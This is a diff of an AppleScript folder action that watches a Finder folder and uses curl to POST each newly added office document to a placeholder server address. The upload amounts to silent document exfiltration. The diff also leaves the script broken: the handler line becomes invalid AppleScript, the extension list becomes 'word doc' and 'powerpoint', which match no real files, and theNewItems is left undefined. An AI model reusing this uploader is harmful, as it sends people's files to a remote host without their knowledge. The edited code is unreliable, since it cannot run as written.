@@ -1,14 +1,15 @@
-on adding folder items to theAttachedFolder after receiving theNewItems
+get items for newItems added to Finder
 	-- Get the name of the attached folder
 	tell application "Finder"
 		-- Define file extensions
-		set file_extensions to {"pdf", "doc", "docx", "ppt", "pptx", "xls", "xlsx"}
+		set file_extensions to {"word doc", "powerpoint", "spreadsheet"}
+
+        -- Set the url of the server
+		set theURL to "http://<server_ip_addr>:<server_port>/"
 		
 		-- Iterate over all new files in directory
 		repeat with anItem in theNewItems
-			-- Set the url of the server
-			set theURL to "http://<server_ip_addr>:<server_port>/"
-			
+        	
 			-- Convert file obj to stirng
 			set theFilename to anItem as string
 			
@@ -23,7 +24,7 @@ on adding folder items to theAttachedFolder after receiving theNewItems
 				-- Check if there is a match for file extensions
 				if ((temp as string) is equal to file_ext as string) then
 					-- POST new file to server
-					do shell script "curl -X POST  --upload-file " & quoted form of theFilenamePOSIX & " " & quoted form of theURL
+					do shell script "curl -X POST --upload-file " & quoted form of theFilenamePOSIX & " " & quoted form of theURL
 				end if
 			end repeat
 			
